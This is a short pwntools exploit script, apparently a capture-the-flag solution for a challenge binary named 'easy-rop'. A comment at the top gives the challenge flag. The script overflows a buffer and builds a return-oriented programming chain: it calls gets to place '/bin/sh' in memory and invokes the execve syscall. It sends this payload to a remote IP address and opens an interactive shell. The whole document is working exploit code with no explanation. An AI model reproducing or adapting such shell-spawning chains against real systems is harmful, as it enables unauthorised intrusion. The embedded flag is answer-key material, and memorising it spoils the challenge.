#flag = darkCON{w0nd3rful_m4k1n9_sh3llc0d3_us1n9_r0p!!!}
from pwn import *

elf = ELF("./easy-rop")
target = process([elf.path])
target = remote('65.1.92.179', 49153)

popRdi = p64(0x000000000040191a)
popRsi = p64(0x000000000040f4be)
popRax = p64(0x00000000004175eb)
popRdx = p64(0x000000000040181f)
binsh  = p64(0x00000000004c04f0)
syscall= p64(0x00000000004012d3)

payload = "A"*0x48
payload += popRdi + binsh + p64(elf.sym['gets']) + popRax + p64(59) + popRdi + binsh + popRsi + p64(0) + popRdx + p64(0) + syscall
target.sendline(payload)

target.sendline("/bin/sh\x00")

target.interactive()